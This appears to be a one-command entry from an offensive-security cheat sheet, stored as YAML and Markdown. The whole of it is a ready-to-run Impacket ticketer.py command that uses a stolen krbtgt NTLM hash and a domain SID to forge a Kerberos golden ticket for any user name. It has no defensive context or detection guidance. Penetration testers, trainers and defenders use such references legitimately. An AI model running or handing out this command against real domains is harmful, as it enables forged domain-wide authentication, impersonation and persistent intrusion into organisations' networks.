---
id: 50debc87-111b-47a6-aff4-663074d8eb41
name: to generate the TGT with NTLM
type: command
executor: bash
data: 'python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain
  <domain_name> <user_name>

  '
output: null
created_at: '2020-07-14T18:14:48.540333+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# to generate the TGT with NTLM

```bash
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>

```


